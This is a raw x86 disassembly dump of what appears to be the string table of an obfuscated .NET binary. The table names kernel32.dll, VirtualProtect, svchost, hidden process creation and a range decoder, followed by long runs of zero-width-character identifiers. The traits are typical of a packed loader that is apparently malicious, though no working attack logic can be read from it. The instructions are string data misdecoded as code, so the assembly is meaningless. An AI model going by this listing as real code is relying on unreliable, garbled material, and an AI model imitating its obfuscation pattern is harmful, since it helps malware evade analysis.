  4077af:	61                   	popa
  4077b0:	74 68                	je     0x40781a
  4077b2:	00 67 65             	add    %ah,0x65(%edi)
  4077b5:	74 5f                	je     0x407816
  4077b7:	4c                   	dec    %esp
  4077b8:	65 6e                	outsb  %gs:(%esi),(%dx)
  4077ba:	67 74 68             	addr16 je 0x407825
  4077bd:	00 4d 61             	add    %cl,0x61(%ebp)
  4077c0:	72 73                	jb     0x407835
  4077c2:	68 61 6c 00 6b       	push   $0x6b006c61
  4077c7:	65 72 6e             	gs jb  0x407838
  4077ca:	65 6c                	gs insb (%dx),%es:(%edi)
  4077cc:	33 32                	xor    (%edx),%esi
  4077ce:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  4077d1:	6c                   	insb   (%dx),%es:(%edi)
  4077d2:	00 69 6e             	add    %ch,0x6e(%ecx)
  4077d5:	53                   	push   %ebx
  4077d6:	74 72                	je     0x40784a
  4077d8:	65 61                	gs popa
  4077da:	6d                   	insl   (%dx),%es:(%edi)
  4077db:	00 6f 75             	add    %ch,0x75(%edi)
  4077de:	74 53                	je     0x407833
  4077e0:	74 72                	je     0x407854
  4077e2:	65 61                	gs popa
  4077e4:	6d                   	insl   (%dx),%es:(%edi)
  4077e5:	00 4d 65             	add    %cl,0x65(%ebp)
  4077e8:	6d                   	insl   (%dx),%es:(%edi)
  4077e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4077ea:	72 79                	jb     0x407865
  4077ec:	53                   	push   %ebx
  4077ed:	74 72                	je     0x407861
  4077ef:	65 61                	gs popa
  4077f1:	6d                   	insl   (%dx),%es:(%edi)
  4077f2:	00 73 74             	add    %dh,0x74(%ebx)
  4077f5:	72 65                	jb     0x40785c
  4077f7:	61                   	popa
  4077f8:	6d                   	insl   (%dx),%es:(%edi)
  4077f9:	00 53 79             	add    %dl,0x79(%ebx)
  4077fc:	73 74                	jae    0x407872
  4077fe:	65 6d                	gs insl (%dx),%es:(%edi)
  407800:	00 49 73             	add    %cl,0x73(%ecx)
  407803:	4c                   	dec    %esp
  407804:	69 74 74 6c 65 45 6e 	imul   $0x646e4565,0x6c(%esp,%esi,2),%esi
  40780b:	64 
  40780c:	69 61 6e 00 6c 65 6e 	imul   $0x6e656c00,0x6e(%ecx),%esp
  407813:	00 53 79             	add    %dl,0x79(%ebx)
  407816:	73 74                	jae    0x40788c
  407818:	65 6d                	gs insl (%dx),%es:(%edi)
  40781a:	2e 52                	cs push %edx
  40781c:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40781f:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407824:	6e                   	outsb  %ds:(%esi),(%dx)
  407825:	00 49 6e             	add    %cl,0x6e(%ecx)
  407828:	74 65                	je     0x40788f
  40782a:	72 6e                	jb     0x40789a
  40782c:	00 50 72             	add    %dl,0x72(%eax)
  40782f:	6f                   	outsl  %ds:(%esi),(%dx)
  407830:	63 65 73             	arpl   %esp,0x73(%ebp)
  407833:	73 53                	jae    0x407888
  407835:	74 61                	je     0x407898
  407837:	72 74                	jb     0x4078ad
  407839:	49                   	dec    %ecx
  40783a:	6e                   	outsb  %ds:(%esi),(%dx)
  40783b:	66 6f                	outsw  %ds:(%esi),(%dx)
  40783d:	00 44 69 72          	add    %al,0x72(%ecx,%ebp,2)
  407841:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  407846:	79 49                	jns    0x407891
  407848:	6e                   	outsb  %ds:(%esi),(%dx)
  407849:	66 6f                	outsw  %ds:(%esi),(%dx)
  40784b:	00 6c 70 00          	add    %ch,0x0(%eax,%esi,2)
  40784f:	72 61                	jb     0x4078b2
  407851:	6e                   	outsb  %ds:(%esi),(%dx)
  407852:	67 65 44             	addr16 gs inc %esp
  407855:	65 63 6f 64          	arpl   %ebp,%gs:0x64(%edi)
  407859:	65 72 00             	gs jb  0x40785c
  40785c:	42                   	inc    %edx
  40785d:	75 66                	jne    0x4078c5
  40785f:	66 65 72 00          	data16 gs jb 0x407863
  407863:	42                   	inc    %edx
  407864:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  40786b:	72 
  40786c:	74 65                	je     0x4078d3
  40786e:	72 00                	jb     0x407870
  407870:	73 65                	jae    0x4078d7
  407872:	74 5f                	je     0x4078d3
  407874:	52                   	push   %edx
  407875:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  40787c:	53 74 
  40787e:	61                   	popa
  40787f:	6e                   	outsb  %ds:(%esi),(%dx)
  407880:	64 61                	fs popa
  407882:	72 64                	jb     0x4078e8
  407884:	45                   	inc    %ebp
  407885:	72 72                	jb     0x4078f9
  407887:	6f                   	outsl  %ds:(%esi),(%dx)
  407888:	72 00                	jb     0x40788a
  40788a:	2e 63 74 6f 72       	arpl   %esi,%cs:0x72(%edi,%ebp,2)
  40788f:	00 2e                	add    %ch,(%esi)
  407891:	63 63 74             	arpl   %esp,0x74(%ebx)
  407894:	6f                   	outsl  %ds:(%esi),(%dx)
  407895:	72 00                	jb     0x407897
  407897:	49                   	dec    %ecx
  407898:	6e                   	outsb  %ds:(%esi),(%dx)
  407899:	74 50                	je     0x4078eb
  40789b:	74 72                	je     0x40790f
  40789d:	00 53 79             	add    %dl,0x79(%ebx)
  4078a0:	73 74                	jae    0x407916
  4078a2:	65 6d                	gs insl (%dx),%es:(%edi)
  4078a4:	2e 44                	cs inc %esp
  4078a6:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4078ad:	69 63 73 00 53 79 73 	imul   $0x73795300,0x73(%ebx),%esp
  4078b4:	74 65                	je     0x40791b
  4078b6:	6d                   	insl   (%dx),%es:(%edi)
  4078b7:	2e 52                	cs push %edx
  4078b9:	75 6e                	jne    0x407929
  4078bb:	74 69                	je     0x407926
  4078bd:	6d                   	insl   (%dx),%es:(%edi)
  4078be:	65 2e 49             	gs cs dec %ecx
  4078c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4078c2:	74 65                	je     0x407929
  4078c4:	72 6f                	jb     0x407935
  4078c6:	70 53                	jo     0x40791b
  4078c8:	65 72 76             	gs jb  0x407941
  4078cb:	69 63 65 73 00 53 79 	imul   $0x79530073,0x65(%ebx),%esp
  4078d2:	73 74                	jae    0x407948
  4078d4:	65 6d                	gs insl (%dx),%es:(%edi)
  4078d6:	2e 52                	cs push %edx
  4078d8:	75 6e                	jne    0x407948
  4078da:	74 69                	je     0x407945
  4078dc:	6d                   	insl   (%dx),%es:(%edi)
  4078dd:	65 2e 43             	gs cs inc %ebx
  4078e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4078e1:	6d                   	insl   (%dx),%es:(%edi)
  4078e2:	70 69                	jo     0x40794d
  4078e4:	6c                   	insb   (%dx),%es:(%edi)
  4078e5:	65 72 53             	gs jb  0x40793b
  4078e8:	65 72 76             	gs jb  0x407961
  4078eb:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4078f2:	62 75 67             	bound  %esi,0x67(%ebp)
  4078f5:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  4078fc:	65 
  4078fd:	73 00                	jae    0x4078ff
  4078ff:	70 72                	jo     0x407973
  407901:	6f                   	outsl  %ds:(%esi),(%dx)
  407902:	70 65                	jo     0x407969
  407904:	72 74                	jb     0x40797a
  407906:	69 65 73 00 6e 75 6d 	imul   $0x6d756e00,0x73(%ebp),%esp
  40790d:	50                   	push   %eax
  40790e:	6f                   	outsl  %ds:(%esi),(%dx)
  40790f:	73 53                	jae    0x407964
  407911:	74 61                	je     0x407974
  407913:	74 65                	je     0x40797a
  407915:	73 00                	jae    0x407917
  407917:	45                   	inc    %ebp
  407918:	71 75                	jno    0x40798f
  40791a:	61                   	popa
  40791b:	6c                   	insb   (%dx),%es:(%edi)
  40791c:	73 00                	jae    0x40791e
  40791e:	4d                   	dec    %ebp
  40791f:	6f                   	outsl  %ds:(%esi),(%dx)
  407920:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  407923:	73 00                	jae    0x407925
  407925:	4e                   	dec    %esi
  407926:	75 6d                	jne    0x407995
  407928:	42                   	inc    %edx
  407929:	69 74 4c 65 76 65 6c 	imul   $0x736c6576,0x65(%esp,%ecx,2),%esi
  407930:	73 
  407931:	00 6e 75             	add    %ch,0x75(%esi)
  407934:	6d                   	insl   (%dx),%es:(%edi)
  407935:	42                   	inc    %edx
  407936:	69 74 4c 65 76 65 6c 	imul   $0x736c6576,0x65(%esp,%ecx,2),%esi
  40793d:	73 
  40793e:	00 70 6f             	add    %dh,0x6f(%eax)
  407941:	73 00                	jae    0x407943
  407943:	67 65 74 5f          	addr16 gs je 0x4079a6
  407947:	43                   	inc    %ebx
  407948:	68 61 72 73 00       	push   $0x737261
  40794d:	52                   	push   %edx
  40794e:	75 6e                	jne    0x4079be
  407950:	74 69                	je     0x4079bb
  407952:	6d                   	insl   (%dx),%es:(%edi)
  407953:	65 48                	gs dec %eax
  407955:	65 6c                	gs insb (%dx),%es:(%edi)
  407957:	70 65                	jo     0x4079be
  407959:	72 73                	jb     0x4079ce
  40795b:	00 50 72             	add    %dl,0x72(%eax)
  40795e:	6f                   	outsl  %ds:(%esi),(%dx)
  40795f:	63 65 73             	arpl   %esp,0x73(%ebp)
  407962:	73 00                	jae    0x407964
  407964:	6c                   	insb   (%dx),%es:(%edi)
  407965:	70 41                	jo     0x4079a8
  407967:	64 64 72 65          	fs fs jb 0x4079d0
  40796b:	73 73                	jae    0x4079e0
  40796d:	00 6e 75             	add    %ch,0x75(%esi)
  407970:	6d                   	insl   (%dx),%es:(%edi)
  407971:	54                   	push   %esp
  407972:	6f                   	outsl  %ds:(%esi),(%dx)
  407973:	74 61                	je     0x4079d6
  407975:	6c                   	insb   (%dx),%es:(%edi)
  407976:	42                   	inc    %edx
  407977:	69 74 73 00 6e 75 6d 	imul   $0x506d756e,0x0(%ebx,%esi,2),%esi
  40797e:	50 
  40797f:	6f                   	outsl  %ds:(%esi),(%dx)
  407980:	73 42                	jae    0x4079c4
  407982:	69 74 73 00 6e 75 6d 	imul   $0x506d756e,0x0(%ebx,%esi,2),%esi
  407989:	50 
  40798a:	72 65                	jb     0x4079f1
  40798c:	76 42                	jbe    0x4079d0
  40798e:	69 74 73 00 73 65 74 	imul   $0x5f746573,0x0(%ebx,%esi,2),%esi
  407995:	5f 
  407996:	41                   	inc    %ecx
  407997:	72 67                	jb     0x407a00
  407999:	75 6d                	jne    0x407a08
  40799b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40799d:	74 73                	je     0x407a12
  40799f:	00 45 78             	add    %al,0x78(%ebp)
  4079a2:	69 73 74 73 00 43 6f 	imul   $0x6f430073,0x74(%ebx),%esi
  4079a9:	6e                   	outsb  %ds:(%esi),(%dx)
  4079aa:	63 61 74             	arpl   %esp,0x74(%ecx)
  4079ad:	00 4f 62             	add    %cl,0x62(%edi)
  4079b0:	6a 65                	push   $0x65
  4079b2:	63 74 00 6c          	arpl   %esi,0x6c(%eax,%eax,1)
  4079b6:	70 66                	jo     0x407a1e
  4079b8:	6c                   	insb   (%dx),%es:(%edi)
  4079b9:	4f                   	dec    %edi
  4079ba:	6c                   	insb   (%dx),%es:(%edi)
  4079bb:	64 50                	fs push %eax
  4079bd:	72 6f                	jb     0x407a2e
  4079bf:	74 65                	je     0x407a26
  4079c1:	63 74 00 56          	arpl   %esi,0x56(%eax,%eax,1)
  4079c5:	69 72 74 75 61 6c 50 	imul   $0x506c6175,0x74(%edx),%esi
  4079cc:	72 6f                	jb     0x407a3d
  4079ce:	74 65                	je     0x407a35
  4079d0:	63 74 00 66          	arpl   %esi,0x66(%eax,%eax,1)
  4079d4:	6c                   	insb   (%dx),%es:(%edi)
  4079d5:	4e                   	dec    %esi
  4079d6:	65 77 50             	gs ja  0x407a29
  4079d9:	72 6f                	jb     0x407a4a
  4079db:	74 65                	je     0x407a42
  4079dd:	63 74 00 6f          	arpl   %esi,0x6f(%eax,%eax,1)
  4079e1:	70 5f                	jo     0x407a42
  4079e3:	45                   	inc    %ebp
  4079e4:	78 70                	js     0x407a56
  4079e6:	6c                   	insb   (%dx),%es:(%edi)
  4079e7:	69 63 69 74 00 57 61 	imul   $0x61570074,0x69(%ebx),%esp
  4079ee:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  4079f5:	69 
  4079f6:	74 00                	je     0x4079f8
  4079f8:	53                   	push   %ebx
  4079f9:	74 61                	je     0x407a5c
  4079fb:	72 74                	jb     0x407a71
  4079fd:	00 73 76             	add    %dh,0x76(%ebx)
  407a00:	63 68 6f             	arpl   %ebp,0x6f(%eax)
  407a03:	73 74                	jae    0x407a79
  407a05:	00 73 65             	add    %dh,0x65(%ebx)
  407a08:	74 5f                	je     0x407a69
  407a0a:	52                   	push   %edx
  407a0b:	65 64 69 72 65 63 74 	gs imul $0x74537463,%fs:0x65(%edx),%esi
  407a12:	53 74 
  407a14:	61                   	popa
  407a15:	6e                   	outsb  %ds:(%esi),(%dx)
  407a16:	64 61                	fs popa
  407a18:	72 64                	jb     0x407a7e
  407a1a:	4f                   	dec    %edi
  407a1b:	75 74                	jne    0x407a91
  407a1d:	70 75                	jo     0x407a94
  407a1f:	74 00                	je     0x407a21
  407a21:	53                   	push   %ebx
  407a22:	79 73                	jns    0x407a97
  407a24:	74 65                	je     0x407a8b
  407a26:	6d                   	insl   (%dx),%es:(%edi)
  407a27:	2e 54                	cs push %esp
  407a29:	65 78 74             	gs js  0x407aa0
  407a2c:	00 73 65             	add    %dh,0x65(%ebx)
  407a2f:	74 5f                	je     0x407a90
  407a31:	43                   	inc    %ebx
  407a32:	72 65                	jb     0x407a99
  407a34:	61                   	popa
  407a35:	74 65                	je     0x407a9c
  407a37:	4e                   	dec    %esi
  407a38:	6f                   	outsl  %ds:(%esi),(%dx)
  407a39:	57                   	push   %edi
  407a3a:	69 6e 64 6f 77 00 4d 	imul   $0x4d00776f,0x64(%esi),%ebp
  407a41:	61                   	popa
  407a42:	78 00                	js     0x407a44
  407a44:	73 74                	jae    0x407aba
  407a46:	61                   	popa
  407a47:	72 74                	jb     0x407abd
  407a49:	49                   	dec    %ecx
  407a4a:	6e                   	outsb  %ds:(%esi),(%dx)
  407a4b:	64 65 78 00          	fs gs js 0x407a4f
  407a4f:	49                   	dec    %ecx
  407a50:	6e                   	outsb  %ds:(%esi),(%dx)
  407a51:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  407a58:	65 
  407a59:	41                   	inc    %ecx
  407a5a:	72 72                	jb     0x407ace
  407a5c:	61                   	popa
  407a5d:	79 00                	jns    0x407a5f
  407a5f:	47                   	inc    %edi
  407a60:	65 74 43             	gs je  0x407aa6
  407a63:	61                   	popa
  407a64:	6c                   	insb   (%dx),%es:(%edi)
  407a65:	6c                   	insb   (%dx),%es:(%edi)
  407a66:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  407a6d:	6d                   	insl   (%dx),%es:(%edi)
  407a6e:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  407a72:	47                   	inc    %edi
  407a73:	65 74 45             	gs je  0x407abb
  407a76:	78 65                	js     0x407add
  407a78:	63 75 74             	arpl   %esi,0x74(%ebp)
  407a7b:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  407a82:	6d                   	insl   (%dx),%es:(%edi)
  407a83:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  407a87:	42                   	inc    %edx
  407a88:	6c                   	insb   (%dx),%es:(%edi)
  407a89:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8a:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  407a8d:	6f                   	outsl  %ds:(%esi),(%dx)
  407a8e:	70 79                	jo     0x407b09
  407a90:	00 43 72             	add    %al,0x72(%ebx)
  407a93:	65 61                	gs popa
  407a95:	74 65                	je     0x407afc
  407a97:	44                   	inc    %esp
  407a98:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  407a9f:	79 00                	jns    0x407aa1
  407aa1:	e2 81                	loop   0x407a24
  407aa3:	ab                   	stos   %eax,%es:(%edi)
  407aa4:	e2 81                	loop   0x407a27
  407aa6:	ab                   	stos   %eax,%es:(%edi)
  407aa7:	e2 80                	loop   0x407a29
  407aa9:	8c e2                	mov    %fs,%edx
  407aab:	81 ac e2 80 8c e2 80 	subl   $0xae81e28d,-0x7f1d7380(%edx,%eiz,8)
  407ab2:	8d e2 81 ae 
  407ab6:	e2 80                	loop   0x407a38
  407ab8:	aa                   	stos   %al,%es:(%edi)
  407ab9:	e2 80                	loop   0x407a3b
  407abb:	ab                   	stos   %eax,%es:(%edi)
  407abc:	e2 80                	loop   0x407a3e
  407abe:	ab                   	stos   %eax,%es:(%edi)
  407abf:	e2 80                	loop   0x407a41
  407ac1:	8d                   	lea    (bad),%esp
  407ac2:	e2 80                	loop   0x407a44
  407ac4:	8b e2                	mov    %edx,%esp
  407ac6:	80 ae e2 81 aa e2 80 	subb   $0x80,-0x1d557e1e(%esi)
  407acd:	ad                   	lods   %ds:(%esi),%eax
  407ace:	e2 80                	loop   0x407a50
  407ad0:	ad                   	lods   %ds:(%esi),%eax
  407ad1:	e2 81                	loop   0x407a54
  407ad3:	ac                   	lods   %ds:(%esi),%al
  407ad4:	e2 81                	loop   0x407a57
  407ad6:	aa                   	stos   %al,%es:(%edi)
  407ad7:	e2 80                	loop   0x407a59
  407ad9:	ad                   	lods   %ds:(%esi),%eax
  407ada:	e2 80                	loop   0x407a5c
  407adc:	8c e2                	mov    %fs,%edx
  407ade:	81 aa e2 81 af e2 81 	subl   $0x81e2af81,-0x1d507e1e(%edx)
  407ae5:	af e2 81 
  407ae8:	ae                   	scas   %es:(%edi),%al
  407ae9:	e2 81                	loop   0x407a6c
  407aeb:	ab                   	stos   %eax,%es:(%edi)
  407aec:	e2 80                	loop   0x407a6e
  407aee:	8e e2                	mov    %edx,%fs
  407af0:	81 ad e2 80 aa e2 81 	subl   $0x81e2ac81,-0x1d557f1e(%ebp)
  407af7:	ac e2 81 
  407afa:	ac                   	lods   %ds:(%esi),%al
  407afb:	e2 80                	loop   0x407a7d
  407afd:	8b e2                	mov    %edx,%esp
  407aff:	80 ac e2 81 ac e2 80 	subb   $0x8b,-0x7f1d537f(%edx,%eiz,8)
  407b06:	8b 
  407b07:	e2 80                	loop   0x407a89
  407b09:	8f                   	(bad)
  407b0a:	e2 80                	loop   0x407a8c
  407b0c:	8c e2                	mov    %fs,%edx
  407b0e:	80 8e e2 80 8e e2 80 	orb    $0x80,-0x1d717f1e(%esi)
  407b15:	8c e2                	mov    %fs,%edx
  407b17:	80 8c e2 80 ae 00 e2 	orb    $0x80,-0x1dff5180(%edx,%eiz,8)
  407b1e:	80 
  407b1f:	8c e2                	mov    %fs,%edx
  407b21:	81 ae e2 80 8f e2 81 	subl   $0x81e2ad81,-0x1d707f1e(%esi)
  407b28:	ad e2 81 
  407b2b:	ac                   	lods   %ds:(%esi),%al
  407b2c:	e2 80                	loop   0x407aae
  407b2e:	8c e2                	mov    %fs,%edx
  407b30:	80 8f e2 80 8d e2 81 	orb    $0x81,-0x1d727f1e(%edi)
  407b37:	aa                   	stos   %al,%es:(%edi)
  407b38:	e2 81                	loop   0x407abb
  407b3a:	ac                   	lods   %ds:(%esi),%al
  407b3b:	e2 80                	loop   0x407abd
  407b3d:	8e e2                	mov    %edx,%fs
  407b3f:	80 8d e2 81 af e2 80 	orb    $0x80,-0x1d507e1e(%ebp)
  407b46:	8f                   	(bad)
  407b47:	e2 80                	loop   0x407ac9
  407b49:	ae                   	scas   %es:(%edi),%al
  407b4a:	e2 80                	loop   0x407acc
  407b4c:	8c e2                	mov    %fs,%edx
  407b4e:	81 af e2 80 ac e2 81 	subl   $0x80e2af81,-0x1d537f1e(%edi)
  407b55:	af e2 80 
  407b58:	8e e2                	mov    %edx,%fs
  407b5a:	81 af e2 81 ab e2 80 	subl   $0x80e2ae80,-0x1d547e1e(%edi)
  407b61:	ae e2 80 
  407b64:	8c e2                	mov    %fs,%edx
  407b66:	81 ae e2 80 ae e2 81 	subl   $0x80e2ad81,-0x1d517f1e(%esi)
  407b6d:	ad e2 80 
  407b70:	8c e2                	mov    %fs,%edx
  407b72:	80 ae e2 81 ab e2 80 	subb   $0x80,-0x1d547e1e(%esi)
  407b79:	8f                   	(bad)
  407b7a:	e2 80                	loop   0x407afc
  407b7c:	ae                   	scas   %es:(%edi),%al
  407b7d:	e2 81                	loop   0x407b00
  407b7f:	af                   	scas   %es:(%edi),%eax
  407b80:	e2 80                	loop   0x407b02
  407b82:	8f                   	(bad)
  407b83:	e2 81                	loop   0x407b06
  407b85:	ae                   	scas   %es:(%edi),%al
  407b86:	e2 80                	loop   0x407b08
  407b88:	ac                   	lods   %ds:(%esi),%al
  407b89:	e2 81                	loop   0x407b0c
  407b8b:	ae                   	scas   %es:(%edi),%al
  407b8c:	e2 80                	loop   0x407b0e
  407b8e:	8e e2                	mov    %edx,%fs
  407b90:	80 8c e2 80 ae 00 e2 	orb    $0x81,-0x1dff5180(%edx,%eiz,8)
  407b97:	81 
  407b98:	aa                   	stos   %al,%es:(%edi)
  407b99:	e2 81                	loop   0x407b1c
  407b9b:	ac                   	lods   %ds:(%esi),%al
  407b9c:	e2 81                	loop   0x407b1f
  407b9e:	af                   	scas   %es:(%edi),%eax
  407b9f:	e2 81                	loop   0x407b22
  407ba1:	ac                   	lods   %ds:(%esi),%al
  407ba2:	e2 81                	loop   0x407b25
  407ba4:	aa                   	stos   %al,%es:(%edi)
  407ba5:	e2 80                	loop   0x407b27
  407ba7:	8d                   	lea    (bad),%esp
  407ba8:	e2 80                	loop   0x407b2a
  407baa:	8c e2                	mov    %fs,%edx
  407bac:	80 8c e2 80 8f e2 80 	orb    $0xab,-0x7f1d7080(%edx,%eiz,8)
  407bb3:	ab 
  407bb4:	e2 81                	loop   0x407b37
  407bb6:	ad                   	lods   %ds:(%esi),%eax
  407bb7:	e2 81                	loop   0x407b3a
  407bb9:	ab                   	stos   %eax,%es:(%edi)
  407bba:	e2 80                	loop   0x407b3c
  407bbc:	ab                   	stos   %eax,%es:(%edi)
  407bbd:	e2 80                	loop   0x407b3f
  407bbf:	ac                   	lods   %ds:(%esi),%al
  407bc0:	e2 81                	loop   0x407b43
  407bc2:	af                   	scas   %es:(%edi),%eax
  407bc3:	e2 81                	loop   0x407b46
  407bc5:	ab                   	stos   %eax,%es:(%edi)
  407bc6:	e2 81                	loop   0x407b49
  407bc8:	aa                   	stos   %al,%es:(%edi)
  407bc9:	e2 80                	loop   0x407b4b
  407bcb:	8b e2                	mov    %edx,%esp
  407bcd:	80 8f e2 81 ae e2 81 	orb    $0x81,-0x1d517e1e(%edi)
  407bd4:	af                   	scas   %es:(%edi),%eax
  407bd5:	e2 80                	loop   0x407b57
  407bd7:	ad                   	lods   %ds:(%esi),%eax
  407bd8:	e2 80                	loop   0x407b5a
  407bda:	8d                   	lea    (bad),%esp
  407bdb:	e2 81                	loop   0x407b5e
  407bdd:	ac                   	lods   %ds:(%esi),%al
  407bde:	e2 81                	loop   0x407b61
  407be0:	ac                   	lods   %ds:(%esi),%al
  407be1:	e2 81                	loop   0x407b64
  407be3:	ab                   	stos   %eax,%es:(%edi)
  407be4:	e2 80                	loop   0x407b66
  407be6:	ad                   	lods   %ds:(%esi),%eax
  407be7:	e2 81                	loop   0x407b6a
  407be9:	af                   	scas   %es:(%edi),%eax
  407bea:	e2 81                	loop   0x407b6d
  407bec:	ad                   	lods   %ds:(%esi),%eax
  407bed:	e2 80                	loop   0x407b6f
  407bef:	8f                   	(bad)
  407bf0:	e2 80                	loop   0x407b72
  407bf2:	8c e2                	mov    %fs,%edx
  407bf4:	81 ad e2 81 af e2 81 	subl   $0x80e2ae81,-0x1d507e1e(%ebp)
  407bfb:	ae e2 80 
  407bfe:	8c e2                	mov    %fs,%edx
  407c00:	80 ab e2 80 8e e2 80 	subb   $0x80,-0x1d717f1e(%ebx)
  407c07:	8c e2                	mov    %fs,%edx
  407c09:	80 aa e2 80 8c e2 80 	subb   $0x80,-0x1d737f1e(%edx)
  407c10:	ae                   	scas   %es:(%edi),%al
  407c11:	00 e2                	add    %ah,%dl
  407c13:	80 aa e2 81 ab e2 81 	subb   $0x81,-0x1d547e1e(%edx)
  407c1a:	aa                   	stos   %al,%es:(%edi)
  407c1b:	e2 80                	loop   0x407b9d
  407c1d:	8c e2                	mov    %fs,%edx
  407c1f:	81 af e2 81 ae e2 80 	subl   $0x80e2ae80,-0x1d517e1e(%edi)
  407c26:	ae e2 80 
  407c29:	aa                   	stos   %al,%es:(%edi)
  407c2a:	e2 80                	loop   0x407bac
  407c2c:	aa                   	stos   %al,%es:(%edi)
  407c2d:	e2 80                	loop   0x407baf
  407c2f:	8e e2                	mov    %edx,%fs
  407c31:	80 ac e2 80 8f e2 81 	subb   $0xaa,-0x7e1d7080(%edx,%eiz,8)
  407c38:	aa 
  407c39:	e2 81                	loop   0x407bbc
  407c3b:	ad                   	lods   %ds:(%esi),%eax
  407c3c:	e2 81                	loop   0x407bbf
  407c3e:	ad                   	lods   %ds:(%esi),%eax
  407c3f:	e2 80                	loop   0x407bc1
  407c41:	8c e2                	mov    %fs,%edx
  407c43:	80 ab e2 80 8b e2 80 	subb   $0x80,-0x1d747f1e(%ebx)
  407c4a:	8e e2                	mov    %edx,%fs
  407c4c:	80 ab e2 80 8e e2 80 	subb   $0x80,-0x1d717f1e(%ebx)
  407c53:	aa                   	stos   %al,%es:(%edi)
  407c54:	e2 80                	loop   0x407bd6
  407c56:	aa                   	stos   %al,%es:(%edi)
  407c57:	e2 80                	loop   0x407bd9
  407c59:	ae                   	scas   %es:(%edi),%al
  407c5a:	e2 80                	loop   0x407bdc
  407c5c:	8c e2                	mov    %fs,%edx
  407c5e:	80 8b e2 80 ae e2 81 	orb    $0x81,-0x1d517f1e(%ebx)
  407c65:	ab                   	stos   %eax,%es:(%edi)
  407c66:	e2 80                	loop   0x407be8
  407c68:	8e e2                	mov    %edx,%fs
  407c6a:	80 ab e2 81 ad e2 80 	subb   $0x80,-0x1d527e1e(%ebx)
  407c71:	8e e2                	mov    %edx,%fs
  407c73:	80 ae e2 80 8b e2 81 	subb   $0x81,-0x1d747f1e(%esi)
  407c7a:	aa                   	stos   %al,%es:(%edi)
  407c7b:	e2 80                	loop   0x407bfd
  407c7d:	ab                   	stos   %eax,%es:(%edi)
  407c7e:	e2 81                	loop   0x407c01
  407c80:	ad                   	lods   %ds:(%esi),%eax
  407c81:	e2 80                	loop   0x407c03
  407c83:	8f                   	(bad)
  407c84:	e2 81                	loop   0x407c07
  407c86:	ac                   	lods   %ds:(%esi),%al
  407c87:	e2 80                	loop   0x407c09
  407c89:	8c e2                	mov    %fs,%edx
  407c8b:	80 ae 00 e2 81 ae e2 	subb   $0xe2,-0x517e1e00(%esi)
  407c92:	80 aa e2 80 8f e2 80 	subb   $0x80,-0x1d707f1e(%edx)
  407c99:	8d                   	lea    (bad),%esp
  407c9a:	e2 80                	loop   0x407c1c
  407c9c:	8b e2                	mov    %edx,%esp
  407c9e:	80 8c e2 81 aa e2 81 	orb    $0xac,-0x7e1d557f(%edx,%eiz,8)
  407ca5:	ac 
  407ca6:	e2 81                	loop   0x407c29
  407ca8:	ad                   	lods   %ds:(%esi),%eax
  407ca9:	e2 80                	loop   0x407c2b
  407cab:	ac                   	lods   %ds:(%esi),%al
  407cac:	e2 80                	loop   0x407c2e
  407cae:	8d                   	lea    (bad),%esp
  407caf:	e2 80                	loop   0x407c31
  407cb1:	8b e2                	mov    %edx,%esp
  407cb3:	80 ac e2 81 af e2 80 	subb   $0xaa,-0x7f1d507f(%edx,%eiz,8)
  407cba:	aa 
  407cbb:	e2 80                	loop   0x407c3d
  407cbd:	aa                   	stos   %al,%es:(%edi)
  407cbe:	e2 80                	loop   0x407c40
  407cc0:	ad                   	lods   %ds:(%esi),%eax
  407cc1:	e2 80                	loop   0x407c43
  407cc3:	8b e2                	mov    %edx,%esp
  407cc5:	80 8f e2 80 ab e2 80 	orb    $0x80,-0x1d547f1e(%edi)
  407ccc:	ac                   	lods   %ds:(%esi),%al
  407ccd:	e2 81                	loop   0x407c50
  407ccf:	ab                   	stos   %eax,%es:(%edi)
  407cd0:	e2 81                	loop   0x407c53
  407cd2:	ac                   	lods   %ds:(%esi),%al
  407cd3:	e2 81                	loop   0x407c56
  407cd5:	ae                   	scas   %es:(%edi),%al
  407cd6:	e2 80                	loop   0x407c58
  407cd8:	8c e2                	mov    %fs,%edx
  407cda:	81 ad e2 80 8d e2 80 	subl   $0x80e2aa80,-0x1d727f1e(%ebp)
  407ce1:	aa e2 80 
  407ce4:	ad                   	lods   %ds:(%esi),%eax
  407ce5:	e2 81                	loop   0x407c68
  407ce7:	ac                   	lods   %ds:(%esi),%al
  407ce8:	e2 80                	loop   0x407c6a
  407cea:	8c e2                	mov    %fs,%edx
  407cec:	81 ad e2 80 ac e2 80 	subl   $0x80e2ae80,-0x1d537f1e(%ebp)
  407cf3:	ae e2 80 
  407cf6:	8c e2                	mov    %fs,%edx
  407cf8:	80 ac e2 81 ae e2 81 	subb   $0xaf,-0x7e1d517f(%edx,%eiz,8)
  407cff:	af 
  407d00:	e2 80                	loop   0x407c82
  407d02:	ad                   	lods   %ds:(%esi),%eax
  407d03:	e2 80                	loop   0x407c85
  407d05:	8c e2                	mov    %fs,%edx
